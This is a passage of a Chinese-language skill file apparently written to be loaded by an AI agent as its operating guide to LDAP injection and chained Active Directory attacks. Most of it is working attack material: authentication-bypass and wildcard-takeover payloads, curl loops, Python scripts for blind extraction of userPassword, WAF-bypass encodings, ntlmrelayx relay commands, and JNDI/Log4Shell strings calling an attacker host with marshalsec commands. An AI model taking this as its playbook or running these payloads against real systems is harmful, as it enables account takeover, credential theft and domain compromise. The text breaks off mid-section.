---
name: ldap-injection-testing
description: LDAP注入深度测试与域渗透联动高级技能：RFC 4515过滤器语义深度、AND/OR注入、通配符滥用横向接管、认证绕过、RDN/过滤器混淆、盲注高效提取（二分/位运算OID/OAST外带）、非标准属性与AD专属属性利用、LDAPS/StartTLS/通道绑定与NTLM Relay、Spring Data LDAP/ldap3/ldapjs等框架注入差异、WAF绕过、LDAP注入→域枚举→Kerberoasting/noPac/gMSA→提权完整攻击链、2025-2026新CVE实战（CVE-2026-46619/CVE-2026-40459/CVE-2026-58222/CVE-2026-42568）、AI大模型辅助生成Payload与审计LDAP拼接代码
metadata:
  version: 3.0.0
---

# LDAP注入深度测试与域渗透联动技能

> **AI LOAD INSTRUCTION**: LDAP 注入深度测试（v3.0 深攻防版）。覆盖 RFC 4515 过滤器语义、认证绕过、通配符滥用横向接管、OID 位运算盲注高效提取、NTLM Relay 与通道绑定绕过、注入→域枚举→Kerberoasting/noPAC/gMSA 联动链及 2025-2026 新 CVE。基础 `*)(&` 通配绕过按已知前提，直击高阶对抗与域渗透联动。

## 概述

LDAP（轻量级目录访问协议）注入与SQL注入同源（CWE-90：对LDAP查询中特殊元素中和不当），攻击者通过注入LDAP过滤器元字符（`*`、`(`、`)`、`\`、`&`、`|`、`!`）改写查询逻辑，实现**认证绕过、信息泄露、数据盲注提取、权限提升**。由于LDAP目录几乎都是企业的身份基座（Active Directory/OpenLDAP/FreeIPA），一次成功的LDAP注入通常意味着企业身份仓库失守，可沿"注入→信息泄露→域枚举→凭据获取→横向移动→域管"链路直接打通域渗透。

本技能v3.0.0在v2.0基础上深化到**攻防专家实战维度**：不仅覆盖经典AND/OR注入与认证绕过，更深入**RFC 4515过滤器语义与类型混淆、通配符滥用（Wildcard Abuse）横向接管、OID位掩码/位运算盲注提取、OAST外带、非标准属性利用、LDAPS/StartTLS/通道绑定攻击面、主流框架注入差异（Spring Data LDAP/ldap3/ldapjs）、LDAP注入与AD域渗透攻击链联动**，并引入**2025-2026年最新实战漏洞案例**（CVE-2026-46619 OpenAM MSISDN、CVE-2026-40459 PAC4J、CVE-2026-58222 Samba AD、CVE-2026-42568 Yamcs、CVE-2026-11770 389 DS、CVE-2025-61911 python-ldap）与**AI大模型结合**（AI辅助Payload变异、LLM审计拼接代码、Agent/SSO平台LDAP面）。

### 核心概念
- **LDAP过滤器（Filter）**：RFC 4515定义的布尔表达式字符串，用波兰前缀记法，是注入的目标语法
- **DN（Distinguished Name）/RDN（Relative DN）**：条目在目录树中的唯一路径，DN拼接注入与过滤器注入是两类独立攻击面
- **元字符**：`* ( ) \ NUL` 为过滤器转义核心（RFC 4515），`+ ; < > \ # " , =` 为DN转义核心（RFC 4514），两者转义规则不同，混用即漏洞
- **绑定（Bind）**：LDAP认证机制，与"搜索过滤器认证"是两种不同模式——过滤器认证才是注入重灾区
- **OID扩展匹配**：`attr:oid:=value` 语法，AD位掩码（`:1.2.840.113556.1.4.803:`）、递归组成员（`:1.2.840.113556.1.4.1941:`）都是注入可操纵的语义
- **LDAPS/StartTLS**：636端口的SSL/TLS封装与389端口的StartTLS升级，决定中间人/中继攻击面
- **通道绑定/签名**：AD的LDAP安全加固（ADV190023），缺失时NTLM Relay to LDAP可通杀
- **userPassword**：OCTET STRING类型，可用`octetStringOrderingMatch`（OID 2.5.13.18）按字节位运算盲注，这是v3.0新增的高效提取面

### 攻击链全景（v3.0核心方法论）
```
注入点发现 → 过滤器结构推断 → 认证绕过/信息枚举
    ↓
盲注数据提取（布尔/二分/位运算/OAST）
    ↓
AD环境联动：域枚举 → SPN/Kerberoasting → noPac(CVE-2021-42278/42287) → DCSync → 域管
    ↓
AI维度：LLM审计定位拼接点 / AI生成Payload变体加速循环
```

## 一、LDAP协议与过滤器语义深度

### 1.1 LDAP架构基础
```
目录树结构：dc=example,dc=com（根）→ ou=people（组织单元）→ cn=admin（条目）
条目（Entry）= 属性（Attribute）集合，属性由 OID 引用
DN 示例：CN=James Bond,OU=Users,DC=corp,DC=local
RDN 示例：CN=James Bond（DN中最左的组分）
作用域（Scope）：base（仅基DN）/ one（直接子级）/ sub（全部子树）
```

### 1.2 RFC 4515 过滤器语法精讲

**过滤器是前缀（波兰）记法**，与SQL的中缀语法不同，注入时需要精确闭合括号：

```
(attr=value)                 等于/存在（value为*时是存在性测试）
(&(a=1)(b=2))                AND（集合，至少1个元素）
(|(a=1)(b=2))                OR（集合，至少1个元素）
(!(a=1))                     NOT（恰1个元素）
(attr>=value)                大于等于（按匹配规则排序）
(attr<=value)                小于等于
(attr~=value)                近似匹配（实现相关，AD支持有限）
(attr=*value*)               子串匹配（可混合：*a*b*）
(attr:oid:=value)            OID扩展匹配（AD位掩码/递归成员的关键语法）
```

**RFC 4515 转义规则（关键——注入与防护都围绕它）：**
过滤器值中必须对以下字符转义，转义形式为`\`+十六进制：
```
\ → \5c
* → \2a
( → \28
) → \29
NUL → \00
```
**未列入转义集**的`& | ! = < > ~`等在等号右侧（值上下文）无需转义——但若攻击者把输入放在属性名/结构位置（如括号外），它们就变成逻辑运算符。**这就是"转义了却仍然可注入"的经典根因**：开发者只转义了部分场景，或把过滤器转义函数用在了DN上（或反之）。

**匹配规则（大小写敏感性差异）——盲注设计必须知道：**
| 匹配规则 | 属性示例 | 大小写 |
|---------|---------|--------|
| caseIgnoreMatch | cn、sn、mail、sAMAccountName | 不敏感 |
| caseExactMatch | uid（OpenLDAP默认） | 敏感 |
| caseExactIA5Match | userPrincipalName、url | 敏感 |
| octetStringMatch | userPassword、objectSid | 按字节 |

### 1.3 过滤器类型混淆与解析差异

**（1）值/结构上下文混淆：** 同一输入进入不同拼接位置产生不同漏洞类型：
```
# 值上下文（等号右侧）→ 注入元字符闭合再扩展
filter = "(&(uid=" + user + ")(userPassword=" + pass + "))"
输入 user = *)(|(uid=*   → 闭合 (uid= 后注入OR

# 属性名上下文 → 可注入OID扩展/替换属性
filter = "(" + attr + "=" + val + ")"
输入 attr = uid)(|(objectClass=*   → 直接改写整个过滤器结构

# DN上下文 → 需按RFC 4514转义，逗号/加号是分隔符
base = "ou=" + input + ",dc=corp,dc=local"
输入 input = people,dc=evil,dc=com   → 基DN逃逸
```

**（2）OID扩展匹配的类型混淆（AD特有，盲注利器）：**
```
# 普通属性比较
(sAMAccountName=admin)
# 换成位掩码OID → 语义从"等于"变为"按位与"：
(userAccountControl:1.2.840.113556.1.4.803:=2)   # 值第2位为1（禁用账户）
(userAccountControl:1.2.840.113556.1.4.803:=65536) # 值第17位为1（DONT_EXPIRE_PASSWORD）
# 换成递归匹配OID → 深度组成员：
(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)
# 换成排序OID → 按字节序比较（OID 2.5.13.18，见第五章5.3位运算提取）
(userPassword:2.5.13.18:=\64\00\01\02...)
```

**（3）实现差异：** 同一过滤器在不同服务器上解析结果不同（RFC实现偏差）：
- AD对`(attr=*)`存在性测试、空值、超长过滤器的容错与OpenLDAP不同
- OpenLDAP有`sizeLimit/timeLimit`，AD有`MaxPageSize`（默认1000/2000），影响枚举上限
- 某些服务器对尾随未闭合括号的容错度不同（`(&(uid=admin)(|(password=x)`可被部分实现容忍）——**模糊测试时按"畸形→半闭合→完整闭合"梯度递进**

### 1.4 注入点识别与过滤器结构推断

**识别注入点的特征请求（Burp/ffuf）:**
```
# 1. 提交包含LDAP元字符的输入，观察响应差异/错误
user=*            → 若返回用户或不同错误 → 存在通配符注入
user=)(&(1=1))    → 若报错信息含filter语法 → 确认后端LDAP
user=admin%00     → 老版本C实现截断测试

# 2. 错误信息泄露（LDAP错误码会回显结构）
# 返回类似 "Bad search filter"、"protocol error"、"AILTER" → LDAP后端
# AD错误：0x51（服务器忙）/0x52（不可用）/0x10（LDAP_NO_SUCH_OBJECT）→ 可推断基DN
```

**结构推断方法（类比SQL注入的字段数探测）：**
```
# 原过滤器假设：(&(uid=INPUT)(userPassword=xxx))
# 用闭合数递增法推断括号深度：
INPUT=*                → 匹配任何用户 → 确认至少有一层括号
INPUT=*)(             → 语法错误 → 确认闭合后仍有后续条件
INPUT=*)(|(cn=*))     → 若成功 → 确认结构为 (&(uid=*)(|(cn=*))(userPassword=xxx))
# 直到成功闭合所有括号即还原出完整过滤器模板
```

## 二、LDAP攻击面测绘

### 2.1 应用层注入点清单
| 场景 | 典型过滤器模板 | 注入价值 |
|------|--------------|---------|
| 登录认证 | `(&(uid=USER)(userPassword=PASS))` | 认证绕过、盲注 |
| 用户搜索/通讯录 | `(cn=*KEY*)` | 枚举、盲注 |
| 邮箱/手机找回 | `(mail=KEY)` | 枚举、横向接管 |
| 单点登录SSO | 依赖PAC4J/Spring LDAP的ID搜索 | 会话伪造 |
| 权限/组成员检查 | `(&(uid=U)(memberOf=G))` | 逻辑篡改 |
| 设备/IoT注册 | `(macAddress=KEY)` | 设备伪造 |
| MFA二次验证 | `(phoneNumber=KEY)` | 验证码绕过对象定位 |
| 密码重置 | `(&(uid=U)(challenge=KEY))` | 任意用户接管 |
| RAG/企业AI搜索 | 文档ACL过滤 `(owner=KEY)` | AI上下文越权（见第十章） |

### 2.2 网络层攻击面
```
端口/协议        用途                    攻击面
389  TCP        明文LDAP              嗅探、降级、中继
636  TCP        LDAPS(TLS)            证书校验/通道绑定绕过
3268 TCP        AD全局编录(GC)         跨域枚举、搜索绕过分区限制
3269 TCP        GC over SSL            同上+加密
2171/2172       ADAM/LDS              轻量级目录服务独立攻击面
88   UDP/TCP    Kerberos               与LDAP数据联动（见第九章）
```

### 2.3 LDAP URL、扩展操作与JNDI攻击面

**LDAP URL注入（RFC 4516）：** 若应用接受URL参数：
```
ldap://host:port/DN?attrs?scope?filter?extensions
ldap://corp.local/dc=corp,dc=local?cn,mail?sub?(uid=*)
# 注入filter段：
ldap://corp.local/dc=corp,dc=local???sub?(|(uid=*)(objectClass=*))
# 注入base DN段逃逸分区：
ldap://corp.local/OU=Restricted,DC=corp,DC=local?cn?sub?(objectClass=user)  ← 逃逸限制OU
```

**扩展操作与修改类攻击面（比Search更致命）：**
```
# Compare操作（AD）：攻击者控制属性名时可注入过滤器（CVE-2026-58222 Samba案例）
#   Samba AD DC处理LDAP Compare请求时未校验属性名+可信上下文执行搜索
#   → 低权限用户提取 msKds-RootKeyData（gMSA密钥）→ 离线推导gMSA密码 → 域沦陷
# Modify/Add/Delete：注入改属性 → 改组成员/重置密码/设置SPN（见第九章9.3）
# Control对象：LDAP_SERVER_SD_FLAGS_OID (1.2.840.113556.1.4.801) 读安全描述符
#   LDAP_SERVER_SEARCH_OPTIONS_OID (1.2.840.113556.1.4.1340) 控制搜索行为
```

**JNDI注入（Log4Shell类LDAP利用，保留v2.0核心）：**
```
# 当应用对用户可控字符串执行 InitialContext.lookup()（如Log4j2的${jndi:ldap://...}）
# 恶意LDAP服务器可返回：Reference指向远程class / 序列化Gadget对象
${jndi:ldap://attacker:1389/exploit}
${jndi:ldaps://attacker:636/exploit}
${jndi:ldap://attacker:1389/Basic/Command/Base64/<base64命令>}   # JNDI-Injection-Exploit格式

# 搭建恶意LDAP服务器：
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit" 1389
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A attacker
```

### 2.4 匿名绑定与未认证枚举面
```bash
# 匿名绑定探测（严禁在生产环境随意操作，先确认授权）
ldapsearch -x -H ldap://target -b "dc=corp,dc=local" -s base namingContexts
ldapsearch -x -H ldap://target -b "" -s base "*" "+"
# 若返回 namingContexts/rootDSE 信息 → 未限制匿名
# OpenLDAP常允许匿名读；AD默认部分允许匿名读rootDSE与某些属性
```

## 三、认证绕过与通配符滥用

### 3.1 经典永真条件绕过（v2.0核心保留并深化）

原始查询：`(&(uid=USER)(userPassword=PASS))`

```
# ① 密码位注入（最通用）
PASS = *                    → (&(uid=admin)(userPassword=*)) 存在性测试恒真
PASS = *)(|(uid=*))         → 闭合后追加OR恒真分支
PASS = *)(|(objectClass=*)) → 同上，objectClass必存在更稳

# ② 用户名位注入（闭合第一个条件）
USER = admin)(&))           → (&(uid=admin)(&))(userPassword=xxx) 恒真
USER = admin)(|(password=*))→ (&(uid=admin)(|(password=*))(userPassword=xxx))
USER = *)(|(uid=*))         → 直接命中第一个用户（可能是管理员，注意首条目即admin的目录）

# ③ 双字段配合（PayloadsAllTheThings经典）
USER = *)(uid=*))(|(uid=*
PASS = password
→ (&(uid=*)(uid=*))(|(uid=*)(userPassword=password)) 命中所有用户

# ④ 取反构造（NOT闭合）
USER = admin)(!(&(1=0
PASS = q))
→ (&(uid=admin)(!(&(1=0)(userPassword=q))))  内层恒假取反恒真
```

### 3.2 AND/OR/NOT逻辑注入深化

**OR短路泄露（盲注属性提取的标准姿势）：**
```
USER = htb-stdnt)(|(description=*
PASS = invalid)
→ (&(uid=htb-stdnt)(|(description=*)(password=invalid)))
# 若description非空则登录"成功"→ 用 description=<前缀>* 逐字符盲注该属性
```

**双重否定绕过简单过滤规则：**
```
# 检测规则若拦 (objectClass=*) 或 (uid=*)，用等价恒真替换：
USER = *)(!(!(objectClass=*)))
→ 双重NOT = 恒真，绕过基于特征串的WAF/黑名单
```

**AND中注入假条件制造可控分支（时间/错误盲注辅助）：**
```
USER = admin)(&(badattr=*)(|(cn=
→ (&(uid=admin)(&(badattr=*)(|(cn=*))(password=xxx))
# 不存在属性badattr → 整体假 → 与真条件响应差异可用于二分枚举
```

### 3.3 通配符滥用（Wildcard Abuse）——横向接管（2026热点）

**核心洞察（2026年多起CVE共性）：** 只要输入中的`*`未被转义，攻击者即使**不知道密码**，也能用**已知的一个合法密码**横向接管"第一个匹配用户"：

```
# CVE-2026-42568 Yamcs LdapAuthModule：username直接拼接filter
curl -X POST "http://TARGET:8090/auth/token" \
  -d "grant_type=password&username=*&password=known_password"
# 过滤器变为 (&(uid=*)(password=known_password)) → 返回第一个共享该密码/更前面的用户
# → 水平权限提升：攻击者掌握任意一个弱密码即可接管密码相同或排序更靠前的账户

# 通配符+已知口令自动化横向接管
for user in "a*" "ad*" "adm*" "admin*" "*"; do
  curl -s -X POST http://target/auth \
    -d "username=$user&password=Spring2026!" -w "%{http_code} $user\n"
done
# 命中200即接管——排序靠前的管理员账号通常比普通用户更早命中
```

**通配符滥用等级：**
```
*                 → 命中第一条（任意用户，通常是第一条管理员）
a*  ad*  adm*     → 前缀定向命中（缩小到目标前缀）
*)(|(cn=*)        → 结构化命中
*))(|(cn=*))      → 外层有额外括号时的变体
```
**实战提示：** 排序靠前策略——AD中 `(uid=*)` 通常按目录树顺序返回，`ou=Administrators` 前置于普通用户OU时威胁更大；目录用户数量越大，`*` 命中管理员的概率越高。

### 3.4 RDN/过滤器混淆与截断

**（1）RDN（DN上下文）混淆：**
```
# 基DN注入逃逸分区
base = "ou=" + input + ",dc=corp,dc=local"
input = Restricted,dc=corp,dc=local        → 基DN逃逸到整域搜索
input = Restricted,dc=corp,dc=local\0A,... → 换行注入LDIF修改
# DN内RFC 4514转义要求转义：+ ; < > \ # " , =
# 若开发者只做了过滤器转义(filters)未做DN转义(nameEncode)，此处即可利用
```

**（2）空字节截断（老版本C实现）：**
```
USER = admin%00          → C字符串在NUL处截断，密码检查被丢弃
USER = *)(uid=*))%00     → 闭合后NUL截断，丢弃尾部(userPassword=...)
# 现代实现（Java/Python/新OpenLDAP）已拒绝NUL，但C写的老系统仍存在
```

**（3）畸形括号与注释：**
```
# LDAP不支持注释语法，但部分实现容忍尾随未闭合/多余括号
USER = admin)   → 部分服务器容错返回（畸形容错模糊测试）
USER = *)(&     → 未闭合AND（部分实现忽略后续）
```

### 3.5 2025-2026实战案例（时效性验证）

**CVE-2026-46619：OpenAM MSISDN认证绕过（无需密码拿会话）**
```
POST /openam/json/realms/root/authenticate?authIndexType=module&authIndexValue=MSISDN HTTP/1.1
X-OpenAM-Username: *
{"authId":"<valid-auth-tree-id>",
 "callbacks":[{"type":"NameCallback",
   "input":[{"name":"IDToken1","value":"*)(uid=*"}]}]}
# 过滤器 (sunIdentityMSISDNNumber=*)(uid=* → 返回首个用户 → OpenAM签发该用户会话
# 根因：MSISDN号码直接拼接过滤器 + 可信网关默认allow-all（双漏洞叠加）
```

**CVE-2026-40459：PAC4J多方法LDAP注入（CVSS 8.8）**
```
# 影响 PAC4J <4.5.10 / <5.7.10 / <6.4.1，低权限攻击者注入ID类搜索参数
# 后果：未授权LDAP查询 + 任意目录操作 → 常用于SSO认证链（CAS等依赖PAC4J）
# 检测：对所有以ID/名称类参数驱动的查找接口注入 *) 观察响应差异
```

**CVE-2026-42568：Yamcs认证模块通配符横向接管（见3.3）**

**CVE-2026-58222：Samba AD DC Compare注入 + 授权缺失（gMSA沦陷）**
```
# 低权限域用户 → 提取 msKds-RootKeyData → 离线推导gMSA密码 → 若gMSA有高权限 → 域沦陷
# 面：LDAP Compare 请求的用户可控属性名未被过滤，且在可信上下文执行内部搜索
```

## 四、信息枚举与非标准属性利用

### 4.1 通配符与存在性枚举
```
# 枚举所有对象/用户
(objectClass=*)            → 所有条目
(objectClass=user)         → AD用户对象
(objectClass=person)       → 人对象（OpenLDAP）
(uid=*)                    → 所有uid
(sAMAccountName=*)         → AD所有账户
(mail=*@*)                 → 有邮箱对象
(userPassword=*)           → 存在密码哈希的对象
(memberOf=*)               → 有组成员关系的对象
```

### 4.2 属性字典与非标准属性（v3.0新增维度）
```
# 默认属性（*)(ATTR=* 可注入探测的属性字典，来自PATT实证）：
userPassword surname name cn sn objectClass mail givenName commonName uid
# 非标准/易被忽视的"藏宝"属性（搜索、description、注释类）：
description        → 常存明文口令/备注（HTB经典场景）
info / comment     → 备注信息
extensionAttribute1-15 → AD自定义扩展属性，企业常用其存工号/部门/手机
physicalDeliveryOfficeName / postalAddress / homePhone / pager
wWWHomePage / url / thumbnailPhoto(照片可能泄露工牌)
# AD身份类专属：
sAMAccountName userPrincipalName distinguishedName objectSid objectGUID
servicePrincipalName(SPN) userAccountControl primaryGroupID badPwdCount
whenCreated whenChanged lastLogon lastLogonTimestamp accountExpires
memberOf member msDS-AllowedToDelegateTo msDS-AllowedToActOnBehalfOfOtherIdentity
adminCount(≥1表示受保护组)  dNSHostName operatingSystem operatingSystemVersion
```
**利用姿势：** 搜索功能若回显任意属性，先请求 `*` 或 `+`（操作属性）看全部字段：
```bash
ldapsearch -x -H ldap://target -b "ou=Users,dc=corp,dc=local" "(uid=admin)" "*" "+"
```

### 4.3 AD专属属性利用（与第九章联动）
```
# 定位特权对象
(adminCount=1)                          → 受保护(高权限)组内对象
(adminCount>=1)                         → 同上（数值过滤）
(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local) → 递归域管
(primaryGroupID=512)                    → Domain Admins主组
(primaryGroupID=516)                    → Domain Controllers主组

# 定位攻击面对象
(servicePrincipalName=*)                → Kerberoasting目标
(userAccountControl:1.2.840.113556.1.4.803:=65536) → 密码永不过期（多为服务账户）
(!(userAccountControl:1.2.840.113556.1.4.803:=2))  → 未禁用账户
(userAccountControl:1.2.840.113556.1.4.803:=4194304) → TrustedForDelegation(可委派)
(msDS-AllowedToDelegateTo=*)            → 约束委派目标
(msDS-AllowedToActOnBehalfOfOtherIdentity=*) → RBCD目标
(servicePrincipalName=*)&(userAccountControl:1.2.840.113556.1.4.803:=4194304) → 可Kerberoast+委派

# 识别未设置UF_DONT_EXPIRE_PASSWD的账户（弱口令喷洒优先）
```

### 4.4 敏感属性读取与密码爆破
```
# userPassword（OpenLDAP/FreeIPA）：多为{SSHA}/{CRYPT}哈希 → 离线破解
(userPassword=*)
# AD的unicodePwd不可读（LDAP限制），但可注入探测其存在性
# msKds-RootKeyData（gMSA密钥，CVE-2026-58222利用目标）：需高权限读取，注入Compare可比对

# 基于登录态的密码爆破/喷洒（结合注入的prefix搜索）：
# 已有合法低权口令时，用通配符前缀横向接管（见3.3）
# 无任何口令时，盲注prefix搜索密码：
USER = admin)(&(userPassword=M*
PASS = x
→ 命中(admin存在且密码以M开头) 逐字符提取（见第五章）
```

## 五、LDAP盲注与高效数据提取

### 5.1 布尔盲注基础与正负响应识别
```
# 正负响应候选：登录成功/失败文案、HTTP状态码、搜索结果数、错误详情、响应时间
# 确认注入与识别正负：
USER=admin)(&(userPassword=*      → 正（密码非空）
USER=admin)(&(userPassword=ZZZZ*  → 负（前缀不符）
# 逐字符：
(&(uid=admin)(userPassword=a*)) : OK
(&(uid=admin)(userPassword=b*)) : KO
...
(&(uid=admin)(userPassword=ad*)) : OK  → 继续
```

### 5.2 二分法优化（O(log N)）
```
# 前提：可使用 (userPassword>=mid) 排序比较（caseExact/octetString排序）
# 对caseIgnore类属性也可用 >= 的词典序比较
(&(uid=admin)(userPassword>=m))  → 字符是否大于等于'm'
# 每字符8次查询（二分ASCII/Unicode区间）代替64-128次线性扫描
# 结合子串前缀可先二分定位长度区间（*(len探测用 (userPassword=*) 与空串比较）
```

### 5.3 位运算提取（v3.0新增——octetStringOrderingMatch）

`userPassword`是OCTET STRING，可对**字节**做`>=`排序比较（OID 2.5.13.18 逐位大端比较）：
```
# 过滤器中可用 属性:2.5.13.18:=<字节序列> 指定按字节序比较
(userPassword:2.5.13.18:=\64\00\01\02)
(userPassword:2.5.13.18:=\64\00)        # 前缀匹配
(userPassword:2.5.13.18:=\64\00\01)     # 每多一个字节精确一位
# 盲注：构造前缀字节序列，逐字节扩展：
# 第一字节二分0x00-0xFF（8次查询）→ 第二字节…（每字节8次，比字符集线性快一个量级）
# 命中即知哈希/明文的前缀字节，用于复现哈希或密钥材料
```
**适用性：** OpenLDAP等支持显式匹配规则的服务器；AD对userPassword比较有限，但**任何可排序的二进制属性**（objectSid、msKds-RootKeyData、GUID）都适用此思路。

### 5.4 OAST/OOB外带（无回显场景）
```
# 原理：目录侧通常无出网能力，OAST主要用于确认"服务器是否真的执行了注入的过滤器"
# 场景：过滤器内引用可触发服务器出网的属性值（如mail记录为攻击者域名、URL属性）
# 通用OAST通道：DNS/HTTP（Burp Collaborator、interact.sh、dnslog.cn、自建OAST）
# 触发形态（取决于目录与应用行为，多数需应用层配合）：
#   应用把搜索结果写入日志/发送邮件/回调 → 间接外带
#   更常见：盲注本身即可完成提取，OAST仅作存在性证明（如POC验证）
```
**实战定位：** 当应用无任何正负差异且无错误输出时，优先确认是否存在**可观察的搜索行为**（日志、LDAP审计、监控告警）——OAST验证优先级低于布尔/时间盲注的普适性，不要过度依赖。

### 5.5 自动化脚本（可直接复制改造）
```python
import requests, string

URL = "http://TARGET/login"
POSITIVE = "Login successful"          # 正响应特征串
TARGET_USER = "admin"                   # 目标用户
EXFIL_ATTR = "userPassword"             # 提取属性
ALPHABET = string.printable             # 按需缩小为 string.ascii_letters+digits+"@._-"

flag = ""
while True:
    found = False
    for c in ALPHABET:
        # OR短路注入：登录成功 ⟺ 属性以 flag+c 开头
        username = f"{TARGET_USER})(|({EXFIL_ATTR}={flag}{c}*"
        password = "invalid)"
        r = requests.post(URL, data={"username": username, "password": password},
                          timeout=10)
        if POSITIVE in r.text:
            flag += c
            print(f"[+] {EXFIL_ATTR}: {flag}", flush=True)
            found = True
            break
    if not found:
        print(f"[*] 提取完成: {flag}")
        break
```

```python
# 有效LDAP字段发现（*)(ATTR=*))%00 批量探测）
import requests
fields, url = [], "http://TARGET/login"
for attr in ["userPassword","surname","name","cn","sn","objectClass","mail",
             "givenName","commonName","description","extensionAttribute1","info"]:
    r = requests.post(url, data={"username": f"*)({attr}=*))%00", "password": "x"})
    if "Login success" in r.text:
        fields.append(attr)
print("有效字段:", fields)
```

## 六、WAF与过滤器绕过

### 6.1 编码绕过
```
# URL编码（传输层解码后仍为原文注入）
( → %28   ) → %29   * → %2a   & → %26   | → %7c   ! → %21   = → %3d
# 双重URL编码（WAF解一次、应用又解一次的场景）
( → %2528
# Unicode/十六进制（部分框架/JVM层解码）
\u0028 → (    \x28 → (    %u0028 → (
# 等号右侧转义形式本身（\28）——若WAF按原文匹配字符则拦不住，但LDAP服务器会解码：
USER = \2a)  → 服务器解码为 *) → 注入
```

### 6.2 语法混淆
```
# 空格/空白（LDAP语法允许属性、运算符与括号间空白；值内空白有意义不可删）
( cn = admin )          → 部分实现容忍
(& (uid=admin) (userPassword=*) )
# 通配符变形（针对"拦截*"的规则）
cn=ad*in                → 前缀+后缀
cn=*dmi*                → 中缀
cn=*                    → 存在性
# 大小写混淆（针对"拦截(&(|"串的规则）
(&  →  &（LDAP运算符大小写不敏感，部分实现）
(uid=Admin) vs (uid=admin)  → 匹配规则差异（见1.2）
# 逻辑重构（不出现原始特征串的等价恒真）
恒真1: (|(cn=*)(!(cn=*)))
恒真2: (!(!(uid=*)))
恒真3: (&(uid=*)(|(objectClass=*)(objectClass=*)))
```

### 6.3 语义绕过（针对内容型WAF/应用层过滤）
```
# 若应用/网关拦截 *( 组合，改用单字符通配符不存在（LDAP无?），但可：
# ① 利用存在性属性
USER = admin)(&(description=*
# ② 用>= 代替子串
USER = admin)(&(userPassword>=a
# ③ 注入到属性名位置（6.2/1.3的上下文混淆）
attr = objectClass)(uid=admin  → (objectClass)(uid=admin)(=x)
# ④ 双参数污染（HPP）：username同时出现在两个字段，后端取拼接后者的值
```

### 6.4 传输层绕过
```
# Content-Type混淆（WAF按content-type决定是否解析body）
application/json; charset=utf-7
text/x-ldaprequest / application/ldap+json
# 分块传输
Transfer-Encoding: chunked
# 参数位置变换：GET query / POST form / multipart / JSON body 逐一尝试
# 加密通道：HTTPS终止后WAF无感知的纯内网面（若WAF部署位置在TLS之后则失效）
```

## 七、协议与传输面：LDAPS/StartTLS/通道绑定/中继

### 7.1 明文LDAP vs LDAPS vs StartTLS
```
明文LDAP(389)         → 凭据/查询可嗅探；中间人可篡改（最危险）
LDAPS(636)            → TLS直连；需校验证书链
StartTLS(389升级)      → 先明文后TLS升级；存在降级面（客户端不强制时攻击者可阻截升级）
攻击视角：
- 应用连接LDAP不校验证书/信任自签 → 中间人注入恶意LDAP服务器 → 窃取绑定凭据/返回伪造结果
- StartTLS未强制 → 降级为明文 → 嗅探
- 客户端配置LDAPS但解析到攻击者IP（LLMNR/NBNS投毒）→ 伪造LDAP服务器
```

### 7.2 通道绑定与签名缺失（AD核心加固检查项）
```
# 未启用LDAP签名：NTLM凭据可在链路上被中继
# 未启用通道绑定（LdapEnforceChannelBinding=0）：
#   → 攻击者与DC建立TLS，同时中继受害者NTLM认证到该TLS会话 → 绕过LDAPS限制
# 检查项（Blue Team视角，攻方验证目标是否已加固）：
- DC组策略 "域控制器: LDAP服务器签名要求" = 无 → 可利用
- 注册表 LdapEnforceChannelBinding=0 → 可利用
- 查询：
ldapsearch -x -H ldap://dc -s base -b "" supportedSASLMechanisms   # 看是否暴露GSSAPI
```

### 7.3 LDAP中继攻击（NTLM Relay to LDAP）
```
# 经典链：coerce认证 → 中继到LDAP → 提权
# PetitPotam/PrinterBug(MS-RPRN) 强制目标机器发起认证
# ntlmrelayx 将认证中继到LDAP/LDAPS → 为目标机器加 RBCD 委派 / 加机器账户 / 改属性
ntlmrelayx.py -t ldap://dc.corp.local --delegate-access
ntlmrelayx.py -t ldaps://dc.corp.local --escalate-user alice
# 前提：LDAP签名/通道绑定未强制；目标出网到中继机
# LDAPS(636) + 无通道绑定仍可中继（CVE-2019-1040后利用通道绑定绕过）
# 2025-2026现状：多数企业已启用签名，但老系统/非Windows设备（NAS、防火墙、打印机）常未强制 → 仍可利用
```

### 7.4 JNDI注入与Log4Shell类LDAP利用（保留v2.0核心）
```
# 见2.3节JNDI注入部分；要点回顾：
# 1. 恶意LDAP服务器返回Reference（指向http远程class，JDK<8u191）或序列化Gadget
# 2. Log4j2 ${jndi:ldap://...} 是经典入口（CVE-2021-44228），2025-2026仍常见于老旧中间件
# 3. 工具：marshalsec / JNDI-Injection-Exploit / rogue-jndi
```

## 八、框架注入差异与代码审计

### 8.1 主流框架转义机制对比（v3.0新增）
| 框架/语言 | 过滤器转义函数 | DN转义函数 | 易踩的坑 |
|----------|--------------|-----------|---------|
| Spring Data LDAP (Java) | `LdapEncoder.filterEncode()` | `LdapEncoder.nameEncode()` | 两者混用/只做其一；`AndFilter/EqualsFilter`等DSL未用才安全 |
| Spring Security LDAP | `LdapEncoder.filterEncode`（内部） | - | 自定义`FilterBasedLdapUserSearch`时手拼字符串 |
| python-ldap | `ldap.filter.escape_filter_chars(s, escape_mode=0)` | `ldap.dn.escape_dn_chars()` | **escape_mode=1 + 传list/dict时跳过转义（CVE-2025-61911）** |
| ldapjs (Node) | `ldapjs`过滤器类自动转义；手拼用 `\2a` 等 | `ldapjs.dn` 类 | 直接字符串模板拼filter最常见的洞 |
| C# DirectorySearcher | 无内置函数，手动`Replace` | 无 | `searcher.Filter = "(sAMAccountName="+user+")"` 直拼 |
| PHP | `ldap_escape($val, "", LDAP_ESCAPE_FILTER)` | `LDAP_ESCAPE_DN` | 只对值转义、属性名/结构位不转义 |
| Go ldap/v3 | `ldap.EscapeFilter()` | - | 忘记转义即洞 |

**注意：** 框架自带转义函数 ≠ 安全。常见误用：
```
# ① 转义了但用在DN上（过滤器转义≠DN转义，逗号等未覆盖）
# ② 转义了值但属性名/结构由输入决定
# ③ 转义发生在LDAP解析之后（如先decode再拼filter）
# ④ 完全绕过框架API，用裸字符串拼接（最普遍）
```

### 8.2 框架转义缺陷实战
```
# CVE-2025-61911：python-ldap <3.4.5 escape_filter_chars
# 攻击面：应用调用 escape_filter_chars(value, escape_mode=1) 且value可为list/dict
# 原理：escape_mode=1对list/dict不强制str类型检查 → 直接返回未转义内容
# 修复：3.4.5起非str参数直接抛异常；审计时检查 escape_mode 参数是否被业务传成1

# ldapjs手拼示例（漏洞形态）：
